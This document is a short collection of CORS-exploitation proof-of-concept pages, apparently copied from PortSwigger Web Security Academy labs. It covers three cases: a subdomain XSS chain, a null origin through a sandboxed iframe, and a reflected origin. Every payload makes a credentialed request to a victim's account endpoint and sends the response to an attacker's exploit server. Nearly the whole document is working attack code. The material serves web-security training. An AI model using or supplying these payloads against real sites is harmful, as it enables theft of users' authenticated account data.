Below are some of the PoC for CORS extracted from Portswigger.

### Case 1: CORS through Sub-domain (Needed to have XSS in one of the subdomains) ###

<html>
    <body>
        <h1>PoC for CORS Through Sub-domain</h1>
        <script>
            document.location="http://stock.0a69006d04edea9b807badaa00050063.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a69006d04edea9b807badaa00050063.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a6a000a04a5ea0f8042ac6101fe0029.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
        </script>
    </body>
</html>

### Case 2: Null Origin ###

<html>
<body>
<h2>CORS with null origin</h2>
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable_webiste/endpoint',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit_server/logs?keys='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
</body>
</html>

### Case 3: CORS with the reflected origin ###

<html>
<body>
<h2>CORS with reflected origin</h2>
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable_webiste/endpoint',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/logs?keys='+this.responseText;
    };
</script>
</body>
</html>
